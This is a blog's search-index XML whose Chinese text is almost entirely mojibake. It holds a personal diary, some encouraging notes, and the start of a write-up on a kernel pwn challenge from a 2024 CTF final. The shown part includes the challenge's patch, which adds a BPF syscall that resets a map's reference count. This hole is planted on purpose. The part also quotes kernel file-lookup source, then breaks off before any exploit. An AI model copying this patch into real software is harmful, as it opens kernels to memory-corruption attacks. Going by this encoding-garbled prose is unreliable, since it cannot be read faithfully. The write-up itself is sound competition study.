<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2025å°çç¢ (æŒç»­æ›´æ–°)</title>
      <link href="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/"/>
      <url>/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/</url>
      
        <content type="html"><![CDATA[<p>ps: ç”±äºå›¾ç‰‡å­˜å‚¨åœ¨ github ä¸Šï¼Œä¸å¼€ vpn å¯èƒ½ä¼šåŠ è½½çš„éå¸¸æ…¢ç”šè‡³åŠ è½½ä¸å‡ºæ¥</p><h2 id="ä¸€æœˆ"><a href="#ä¸€æœˆ" class="headerlink" title="ä¸€æœˆ"></a>ä¸€æœˆ</h2><p>ä½ è¯´çš„å¯¹ï¼Œ2025å¹´ä¸€æœˆä¸€å·æˆ‘å°±å¼€å§‹æ”¾å¯’å‡äº†ï¼Œç”±äºæ”¾å‡çš„æ¯”è¾ƒæ—©ï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—åœ¨å­¦æ ¡å¤šå‘†ä¸ªåå‡ å¤©å†å›å»ï¼Œé¡ºä¾¿é€‚åº”ä¸€ä¸‹å¤‡æˆ˜è€ƒç ”çš„æ„Ÿè§‰ã€‚  </p><p>åœ¨æ ¡æœŸé—´å¤±è”äº†å¿«ä¸‰å¹´çš„é«˜ä¸­å®¤å‹ lzx æ¥æ‰¾æˆ‘è¯·æˆ‘åƒé¥­ï¼Œåƒé¥­æœŸé—´èŠäº†å¾ˆå¤šé«˜ä¸­çš„å¾€äº‹ä»¥åŠåœ¨å¤§å­¦çš„ä¸‰å¹´å¹²äº†ä»€ä¹ˆã€‚é¥­å lzx å¸¦æˆ‘å»ä»–çš„å­¦æ ¡å‚è§‚ï¼Œæ‰å‘ç°æˆ‘ä»¬ä¸¤ä¸ªå­¦æ ¡ç›´æ¥çš„è·ç¦»å±…ç„¶è¿™ä¹ˆçš„è¿‘ï¼Œèµ°è·¯å¤§æ¦‚å°±äºŒååˆ†é’Ÿå°±èƒ½åˆ°ã€‚  </p><p>å¤§å­¦åŒç­åŒå­¦å……å“¥ä¹Ÿåœ¨è¿™ä¸ªæœŸé—´æ‰¾æˆ‘å»å¾’æ­¥ï¼ŒåŸå› æ˜¯ä»–åœ¨å®¿èˆå‘†å¤ªä¹…æ„Ÿè§‰è¦å‘éœ‰äº†ï¼Œæƒ³å‡ºå»èµ°èµ°ã€‚ç„¶åä»–çœ‹åˆ°æˆ‘çš„æœ‹å‹åœˆå‘çš„é‚£æ¡æ­¥è¡Œåå…«å…¬é‡Œï¼ˆå½“æ—¶æ˜¯æˆ‘æåº¦æŠ‘éƒç„¶åä¸€ä¸ªäººå‡ºå»æ•£æ•£å¿ƒï¼‰ï¼Œè§‰å¾—æˆ‘èƒ½å¤Ÿå’Œä»–ä¸€èµ·å»ï¼Œæ‰€ä»¥å°±æ‰¾äº†æˆ‘ã€‚æˆ‘ä¸¤æ—©ä¸Šå¾ˆæ—©å°±èµ·åºŠå‡ºå‘ï¼Œä¸€ç›´èµ°åˆ°æ™šä¸Šï¼Œæ„Ÿè§‰å……å“¥å¯ä»¥å»å½“å…¼èŒå¯¼æ¸¸äº†ğŸ˜†ğŸ˜†ğŸ˜†ã€‚  </p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/1.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿˜æœ‰å¯Œå“¥å­¦å¼Ÿ saofeia åœ¨å›å®¶å‰è¯·æˆ‘åƒå¤§é¤ğŸ˜‹  </p><p>è¿™ä¸ªæœˆæœˆåº•ï¼Œå¤§æ¦‚åœ¨å¹´åˆä¸‰çš„æ—¶å€™ï¼Œå°±å’Œå®¶äººè‡ªé©¾æ¸¸å»äº†å°é•¿æ±Ÿã€é«˜æ€¡å²­ã€èŸ’å±±ã€‚æ™¯è‰²ååˆ†çš„å¥½ï¼Œå°±æ˜¯æœ‰ç‚¹é«˜ä¼°è‡ªå·±ï¼Œè¡£æœç©¿çš„ç‰¹åˆ«å°‘ï¼Œå†·æˆå†°å—äº†ğŸ¥¶ã€‚</p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/2.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="äºŒæœˆ"><a href="#äºŒæœˆ" class="headerlink" title="äºŒæœˆ"></a>äºŒæœˆ</h2><p>åœ¨å®¶é‡Œå¤‡æˆ˜è€ƒç ”ï¼Œç»™æ•°å­¦æŠ˜ç£¨çš„å¤´æ˜æ¬²è£‚ï¼Œæ¯å¤©æ—©ä¸Šéƒ½å°½åŠ›æ—©èµ·ï¼Œç„¶åå»éª‘è½¦ã€‚</p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/3.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å›æ ¡å‰ä¹Ÿé™ªå®¶äººå»äº†ä¸€è¶Ÿæ¸…è¿œé•¿éš†æ£®æ—å…¬å›­ã€‚  </p><p>è¿˜æœ‰å°±æ˜¯å­¦å¼Ÿå’Œå¹³æ—¶ä¸€ç›´è·Ÿæˆ‘è¯´ä¸å¯èƒ½æ‰¾åˆ°å¥³æœ‹å‹çš„å¥½å…„å¼Ÿéƒ½è„±å•äº†ğŸ¥¹  </p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/5.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æˆ‘æ„Ÿè§‰æˆ‘æ‰¾ä¸åˆ°ç™¾åˆ†ä¹‹ä¸€ç™¾çš„åŸå› éƒ½æ¥æºäºè‡ªå·±ï¼Œå¹³æ—¶éƒ½æ²¡æ€ä¹ˆå‚åŠ ç¤¾äº¤æ´»åŠ¨ï¼Œä¸‰å¹´ä¸‹æ¥å’Œå¥³ç”Ÿè®²è¯çš„æ¬¡æ•°éƒ½ä¸çŸ¥é“æœ‰æ²¡æœ‰è¶…è¿‡åæ¬¡ğŸ˜­ï¼Œå†åŠ ä¸Šä»Šå¹´è¦è€ƒç ”å’Œè‡ªå·±æœ¬èº«ä¹Ÿæœ‰ä¸€ç‚¹ç¤¾æï¼Œæ„Ÿè§‰æ›´åŠ ä¸å¯èƒ½æ‰¾åˆ°äº†ğŸ˜­ğŸ˜­ğŸ˜­  </p><p>æœˆåº•æ„Ÿè°¢é¾™å“¥ç»™çš„æœºä¼šï¼Œå»äº†ä¸€è¶Ÿæ­å·çš„é˜¿é‡Œç™½å¸½å¤§ä¼šï¼Œè§åˆ°äº†è¶…çº§å¤šéå¸¸å‰å®³çš„å¸ˆå‚…ğŸ˜  </p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/4.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä¹Ÿå»äº†ä¸€ä¸‹ä¸‰å¹´å‰ç¬¬ä¸€æ¬¡æ¥æ­å·ä½çš„é…’åº—é™„è¿‘ï¼ˆè¥¿æ¹–æ—çš„é“¶æ³°ï¼‰ï¼Œå‘ç°ä¸€åˆ‡éƒ½æ²¡æ€ä¹ˆæ”¹å˜ï¼Œå˜çš„æ˜¯æˆ‘ğŸ¥¹</p><p>åŒæ—¶åœ¨æ—¥æœ¬å‚åŠ  seccon ctf final çš„ç©ºç™½å¸®æˆ‘å¸¦ EVA çš„å‘¨è¾¹ï¼Œååˆ†çš„é˜¿é‡Œå˜å¤š(â•¹Ú¡â•¹ )  </p><h2 id="ä¸‰æœˆ"><a href="#ä¸‰æœˆ" class="headerlink" title="ä¸‰æœˆ"></a>ä¸‰æœˆ</h2><p>è¿™ä¸ªæœˆä¸Šæ¥å°±é€äº†æˆ‘ä¸€ä¸ªå¤§æƒŠå–œï¼Œä»æ­å·å›æ¥åçš„ç¬¬ä¸€ä¸ªæ˜ŸæœŸä¸€ï¼Œæ‰“å¼€æ•™åŠ¡ç³»ç»Ÿå‘ç°æˆ‘çš„ç¼–è¯‘åŸç†è¯¾ç¨‹è®¾è®¡æˆç»©ä¸º 56 åˆ†ğŸ¤¡ã€‚è¿™ä¸ªé¡¹ç›®æˆ‘æ˜¯éå¸¸è®¤çœŸçš„ä¸€è¡Œä¸€è¡Œä»£ç çš„å†™çš„ï¼Œè€Œä¸”é¡¹ç›®è¦æ±‚çš„å†…å®¹æˆ‘éƒ½è¿›è¡Œäº†å®ç°ï¼Œèº«è¾¹å¾ˆå¤šåŒå­¦ä»£ç éƒ½è·‘æ­¥èµ·æ¥çš„éƒ½è¿‡äº†ï¼Œå½“åœºçº¢æ¸©äº†ã€‚ç„¶åå°±é©¬ä¸Šåœ¨è€å¸ˆæ™šä¸Šä¸Šè¯¾çš„æ—¶å€™å»æ‰¾ä»–æŠŠäº‹æƒ…é—®æ¸…æ¥šï¼ŒåŸå› æ˜¯æˆ‘çš„è¯¾ç¨‹æŠ¥é“å†™çš„ä¸æ€ä¹ˆå¥½ã€‚ä¸æ˜¯å“¥ä»¬ï¼Œè¯¾ç¨‹è®¾è®¡ç»™åˆ†æ˜¯åªçœ‹æŠ¥é“ä¸çœ‹é¡¹ç›®çš„æ˜¯å§ğŸ˜…ï¼Œæœ€åæŠ˜è…¾äº†ä¸€æ•´ä¸ªæ˜ŸæœŸæ‰æŠŠåˆ†æ•°ç»™æ”¹è¿‡æ¥ï¼ŒæŠ˜ç£¨ï¼ï¼ï¼   </p><p>æ”¹åˆ†æ•°åå‘ç°è¿™ä¸ªé€¼æ•™åŠ¡å‘˜è¿˜æŠŠæˆ‘ç®—è¿›äº†é‡ä¿®ç­ï¼Œè€Œé€‰è¯¾é˜¶æ®µæ—©å·²ç»“æŸï¼Œæ‰€ä»¥åˆè¦æŠ˜è…¾åŠå¤©å»é€€è¯¾ğŸ¤¡  </p><p>å’Œéƒ­é£å»çœ‹äº†ã€ŠçŒ«çŒ«çš„å¥‡å¹»æ¼‚æµã€‹ï¼Œè¿˜æ˜¯ç¬¬ä¸€æ¬¡åœ¨ç”µå½±é™¢çœ‹è¿™ä¹ˆæ–‡è‰ºçš„ç”µå½±ï¼Œä¸çŸ¥é“ä½œè€…æƒ³è¡¨è¾¾ä»€ä¹ˆï¼Œæ‰¾ä¸ªæ—¶é—´å»çœ‹çœ‹è¿™éƒ¨ç”µå½±çš„è§£è¯´  </p><p>æ¥ä¸‹æ¥å°±æ˜¯å›½èµ›åŠå†³èµ›ï¼Œè¿™æ¬¡æ¯”èµ›æˆ‘æ˜¯æŠ±ç€ä¸‰ç­‰å¥–çš„å¿ƒæ€å»çš„ï¼Œæˆ‘å·²ç»å¥½ä¹…æ²¡æœ‰åšå¸¸è§„ pwn é¢˜äº†ï¼Œè€Œä¸”ä¹Ÿæ—©å¿˜è®°æ€ä¹ˆ fix äº†ï¼Œé˜Ÿå‹æ˜¯å¸ˆå¼Ÿï¼Œæ²¡æœ‰ä»€ä¹ˆæ¯”èµ›ç»éªŒï¼Œæ›´åˆ«è¯´ awdp å’Œ isw äº†ã€‚ç»“æœæ—©ä¸Šçš„ awdp æˆ‘æ‰‹å¿«æ‹¿ä¸‹äº†å…¨åœº pwn æœ€é«˜åˆ†å¹¶å¸¦é˜Ÿä¼æ‹¿ä¸‹äº† awdp ç¬¬äºŒåï¼Œå¯æ˜¯ web 0 break 0 fix æ€ä¹ˆå›äº‹ğŸ˜¡ğŸ˜¡ï¼Œisw ä¹Ÿæ²¡æœ‰ä»€ä¹ˆåˆ†ï¼Œæœ€åå‹‰å¼ºæ··åˆ°ä¸€ç­‰å¥–ã€‚</p><img src="/2025/03/20/2025%E5%B0%8F%E7%90%90%E7%A2%8E/6.jpg" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæ‹¿äº†ä¸€ç­‰å¥–åæˆ‘å¹¶æ²¡æœ‰æ„Ÿåˆ°é«˜å…´ï¼Œå†…å¿ƒæ¯«æ— æ³¢æ¾œï¼Œè€Œé˜Ÿå‹å´é«˜å…´çš„åƒä¸ªå­©å­ä¸€æ ·ï¼Œçœ‹æ¥æˆ‘æ˜¯çœŸçš„è€äº†ğŸ‘´  </p><p>æ‰“å®Œæ¯”èµ›åæ™šä¸Šå›åˆ°å®¿èˆå‘ç°å‘çƒ§äº†ï¼Œå€’å¤´å°±ç¡ã€‚ç¬¬äºŒå¤©é†’æ¥å‘ç°å¤´ç—›çš„è£‚å¼€ï¼Œç„¶ååˆç¡äº†ä¸€å¤©ã€‚å»å¹´ä¸‰åˆ°åäºŒæœˆä¹‹é—´å¥½åƒæ²¡æœ‰æ„Ÿå†’è¿‡ä¸€æ¬¡ï¼Œå¯æ˜¯ä»åäºŒæœˆåˆ°ç°åœ¨å¥½åƒå·²ç»å‘çƒ§äº†æœ€å°‘äº”æ¬¡äº†ï¼Œæ„Ÿè§‰æˆ‘çš„èº«ä½“åœ¨è¿™ç§æåº¦é«˜å‹ä»¥åŠæåº¦å¿™ç¢Œçš„ç¯å¢ƒä¸‹è¦è¾¾åˆ°æé™äº†ğŸ˜‡ğŸ˜‡ğŸ˜‡ã€‚  </p><p>æœ€è¿‘è®¤è¯†çš„å¾ˆå¤šå’Œæˆ‘ä¸€å±Šçš„åŒå­¦å’Œè”é˜Ÿçš„å¸ˆå‚…éƒ½é™†ç»­æ‹¿åˆ°äº¬ä¸œã€å­—èŠ‚çš„å®ä¹  offerï¼Œè€Œæˆ‘è¿˜åœ¨è€ƒè¿™ä¸ªé€¼ç ”ç©¶ç”Ÿï¼ŒçœŸæ˜¯åºŸç‰©å•Šâ€¦â€¦  </p><p>æ›¾ç»çš„æˆ‘å¾ˆæƒ³è¯»ç ”ï¼Œå› ä¸ºæˆ‘å‘ç°æˆ‘å¯¹äºŒè¿›åˆ¶å®‰å…¨æœ‰ç€å¾ˆå¤§çš„å…´è¶£ï¼Œéå¸¸æƒ³æ›´åŠ æ·±å…¥çš„å»äº†è§£ã€æ¢ç´¢è¿™ä¸€ä¸ªé¢†åŸŸã€‚ä½†éšç€èº«è¾¹çš„äººé€æ¸æ‹¿åˆ°å„å¤§å…¬å¸çš„ offerï¼Œæˆ‘ç°åœ¨åˆç‰¹åˆ«çš„æƒ³å»æ‰¾ä¸€ä»½å¥½å·¥ä½œã€‚è¿™ä¸¤ä»¶äº‹æƒ…æˆ‘éƒ½å¾ˆæƒ³åšï¼Œå¯æ˜¯æˆ‘èƒ½åŠ›æœ‰é™ï¼Œå¾ˆéš¾å…¼å¾—ã€‚ç›®å‰å°±æ˜¯ä¸€ç›´åœ¨å†…å¿ƒé‡Œå¤„äºååˆ†çŸ›ç›¾çš„çŠ¶æ€ï¼Œéå¸¸å¸Œæœ›æœ‰å¸ˆå‚…èƒ½å¤ŸæŒ‡ç‚¹ä¸€ä¸‹æˆ‘ğŸ¥¹  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è‡´å–œæ¬¢åŠå¤œ emo çš„è‡ªå·±</title>
      <link href="/2025/03/09/emo/"/>
      <url>/2025/03/09/emo/</url>
      
        <content type="html"><![CDATA[<h2 id="By-Csome"><a href="#By-Csome" class="headerlink" title="By Csome"></a>By Csome</h2><p>emoå¹²å•¥<br>å¯¹å‰é€”emoæ˜¯å§<br>æ²¡å¿…è¦<br>å¹²å°±å®Œäº†<br>å“ªæœ‰ä»€ä¹ˆæ­£ç¡®ç­”æ¡ˆ<br>ä½ çš„äººè„‰ï¼Œä½ çš„æœ‹å‹éƒ½æ˜¯ä½ çš„æˆå°±<br>å¤šå¥½</p><h2 id="By-eeee"><a href="#By-eeee" class="headerlink" title="By eeee"></a>By eeee</h2><p>æŠŠæ¯å¤©æ¯å‘¨çš„äº‹éƒ½è®°ä¸‹æ¥<br>ä»€ä¹ˆäº‹è®©ä½ å¼€å¿ƒ<br>è®©ä½ éš¾è¿‡<br>è®©ä½ æœ‰æˆå°±æ„Ÿ<br>ä»Šå¹´ä¸€å®šæ”¹å˜</p><h2 id="By-pazuris"><a href="#By-pazuris" class="headerlink" title="By pazuris"></a>By pazuris</h2><p>æç«¯åŠŸåˆ©ä¸»ä¹‰çš„æ€è€ƒæ€»æ˜¯è®©æˆ‘ä»¬å¿˜å´ï¼šç”Ÿå‘½çš„æœ¬è´¨å…¶å®æ˜¯ä¸€åœºå†ç¨‹</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ‹Ÿæ€ 2024 å†³èµ›: eBeepf</title>
      <link href="/2025/01/15/eBeepf/"/>
      <url>/2025/01/15/eBeepf/</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨æœ€å‰é¢"><a href="#å†™åœ¨æœ€å‰é¢" class="headerlink" title="å†™åœ¨æœ€å‰é¢"></a>å†™åœ¨æœ€å‰é¢</h2><p>æ‹Ÿæ€å†³èµ›å·²ç»ç»“æŸäº†æœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦å†™è¿™ä¸€ç¯‡åšå®¢æ˜¯å› ä¸ºæˆ‘å‘ç°å½“æ—¶æˆ‘ä»¬åœ¨æ¯”èµ›æ—¶å¥½åƒéé¢„æœŸäº†ï¼Œè€Œä¸”éé¢„æœŸåé¢˜ç›®éš¾åº¦å¤§å¹…åº¦ä¸‹é™ï¼Œæ‰€ä»¥æˆ‘è§‰å¾—å¾ˆæœ‰å¿…è¦åˆ†äº«ä¸€ä¸‹æˆ‘ä»¬å½“æ—¶çš„åšæ³•ã€‚</p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>åˆæ˜¯ linux kernel æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå†…æ ¸ç‰ˆæœ¬æ˜¯ 6.11.7  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">                           @@@@</span><br><span class="line">                           @@@</span><br><span class="line">                          @@@</span><br><span class="line">                        @@@@@</span><br><span class="line">             @@@     @@@@@@@@@@@    @@@@@</span><br><span class="line">       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">      @@+            +@@@@@@@@@@@@@</span><br><span class="line">      @%  +%%%@@@@@%*= <span class="comment">#@@@@@@@@@@@</span></span><br><span class="line">      @@@           -=%@@@@@@@@@@@@</span><br><span class="line">       @@@%        +<span class="comment">#@@@@@@@**%@@@@</span></span><br><span class="line">         @@@@@@@@@@%=   <span class="comment">#@++%  #@@</span></span><br><span class="line">          @@@:*@@@%-   +@*  *<span class="comment">#  #@@</span></span><br><span class="line">          @@<span class="comment">#:-#@@@@%==#@=  -**  #@@</span></span><br><span class="line">          @@@-:-+@@@@@@@@+   %<span class="comment">#=  @@</span></span><br><span class="line">           @@@=:::=*@@@@@@<span class="comment">##+=#+  %@@</span></span><br><span class="line">            @@@%=::::::-<span class="comment">#@@=  ###%@@@</span></span><br><span class="line">            @@@@@@@@@@@@@@@@@ <span class="comment">#   @@@</span></span><br><span class="line">            @@@   @@@@      @@@@@@@@</span><br><span class="line"></span><br><span class="line">Boot took 1.99 seconds</span><br><span class="line"></span><br><span class="line">/ $ <span class="built_in">uname</span> -r</span><br><span class="line">6.11.7</span><br></pre></td></tr></table></figure><p>é™„ä»¶ç»™äº†ä¸€ä¸ª bee.patch  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">diff -r linux-6.11.7/include/uapi/linux/bpf.h linux-6.11.7.patched/include/uapi/linux/bpf.h</span><br><span class="line">960a961</span><br><span class="line">&gt; BPF_MAP_RESET_REF,</span><br><span class="line">diff -r linux-6.11.7/kernel/bpf/syscall.c linux-6.11.7.patched/kernel/bpf/syscall.c</span><br><span class="line">5690a5691,5711</span><br><span class="line">&gt; static int bpf_map_do_reset_ref(union bpf_attr *attr)</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;       int ufd = attr-&gt;map_fd;</span><br><span class="line">&gt;       struct bpf_map *map;</span><br><span class="line">&gt;       struct fd f;</span><br><span class="line">&gt;       f = fdget(ufd);</span><br><span class="line">&gt;       map = __bpf_map_get(f);</span><br><span class="line">&gt;       if (IS_ERR(map)) &#123;</span><br><span class="line">&gt;               fdput(f);</span><br><span class="line">&gt;               return PTR_ERR(map);</span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt;       if (map-&gt;max_entries &gt; 60) &#123;</span><br><span class="line">&gt;               fdput(f);</span><br><span class="line">&gt;               return -EINVAL;</span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt;       atomic64_set(&amp;map-&gt;refcnt, 1);</span><br><span class="line">&gt;       atomic64_set(&amp;map-&gt;sleepable_refcnt, 0);</span><br><span class="line">&gt;       fdput(f);</span><br><span class="line">&gt;       return 0;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">5825a5847,5849</span><br><span class="line">&gt; break;</span><br><span class="line">&gt; case BPF_MAP_RESET_REF:</span><br><span class="line">&gt; err = bpf_map_do_reset_ref(&amp;attr);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å‡ºé¢˜äººç»™å†…æ ¸çš„ bpf æ¨¡å—åŠ äº†ä¸€ä¸ªæ–°çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæ¼æ´åº”è¯¥å°±åœ¨è¿™é‡Œäº†ã€‚  </p><h2 id="æ¼æ´åˆ†æä¸åˆ©ç”¨"><a href="#æ¼æ´åˆ†æä¸åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ†æä¸åˆ©ç”¨"></a>æ¼æ´åˆ†æä¸åˆ©ç”¨</h2><p>fd ç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯ file ç»“æ„ä½“å†å¦å¤–åŠ äº†ä¸€ä¸ª flags æ ‡å¿—ä½  </p><p>fdget ä¼šç»è¿‡å¤šå±‚è°ƒç”¨æœ€ç»ˆè°ƒç”¨ __fget_light å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> fd <span class="title function_">fdget</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __to_fd(__fdget(fd));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fdget è°ƒç”¨ __fdget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __fdget(<span class="type">unsigned</span> <span class="type">int</span> fd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __fget_light(fd, FMODE_PATH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__fdget è°ƒç”¨ __fget_light</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Lightweight file lookup - no refcnt increment if fd table isn&#x27;t shared.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can use this instead of fget if you satisfy all of the following</span></span><br><span class="line"><span class="comment"> * conditions:</span></span><br><span class="line"><span class="comment"> * 1) You must call fput_light before exiting the syscall and returning control</span></span><br><span class="line"><span class="comment"> *    to userspace (i.e. you cannot remember the returned struct file * after</span></span><br><span class="line"><span class="comment"> *    returning to userspace).</span></span><br><span class="line"><span class="comment"> * 2) You must not call filp_close on the returned struct file * in between</span></span><br><span class="line"><span class="comment"> *    calls to fget_light and fput_light.</span></span><br><span class="line"><span class="comment"> * 3) You must not clone the current task in between the calls to fget_light</span></span><br><span class="line"><span class="comment"> *    and fput_light.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fput_needed flag returned by fget_light should be passed to the</span></span><br><span class="line"><span class="comment"> * corresponding fput_light.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> __fget_light(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">fmode_t</span> mask)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> =</span> current-&gt;files;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If another thread is concurrently calling close_fd() followed</span></span><br><span class="line"><span class="comment"> * by put_files_struct(), we must not observe the old table</span></span><br><span class="line"><span class="comment"> * entry combined with the new refcount - otherwise we could</span></span><br><span class="line"><span class="comment"> * return a file that is concurrently being freed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * atomic_read_acquire() pairs with atomic_dec_and_test() in</span></span><br><span class="line"><span class="comment"> * put_files_struct().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (likely(atomic_read_acquire(&amp;files-&gt;count) == <span class="number">1</span>)) &#123;</span><br><span class="line">file = files_lookup_fd_raw(files, fd);</span><br><span class="line"><span class="keyword">if</span> (!file || unlikely(file-&gt;f_mode &amp; mask))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span>)file;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">file = __fget_files(files, fd, mask);</span><br><span class="line"><span class="keyword">if</span> (!file)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> FDPUT_FPUT | (<span class="type">unsigned</span> <span class="type">long</span>)file;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„çœ‹è¿™ä¸ª __fget_light å‡½æ•°ï¼Œè¯¥å‡½æ•°ç”¨äºæ ¹æ®æ–‡ä»¶æè¿°ç¬¦ï¼ˆfdï¼‰è·å–å¯¹åº”çš„æ–‡ä»¶ç»“æ„ä½“ struct fileï¼Œä½†æ˜¯å®ƒæœ‰ä¸€äº›é™åˆ¶æ¡ä»¶ï¼Œä½¿å¾—å®ƒçš„ä½¿ç”¨æ¯”æ ‡å‡†çš„æ–‡ä»¶è·å–å‡½æ•° fget æ›´åŠ è½»é‡çº§ã€‚ä»¥ä¸‹æ˜¯ä»£ç çš„ä¸»è¦åŠŸèƒ½å’Œæ­¥éª¤çš„è§£é‡Šï¼š<br>å‡½æ•°å…ˆé€šè¿‡ files_struct *files &#x3D; current-&gt;files 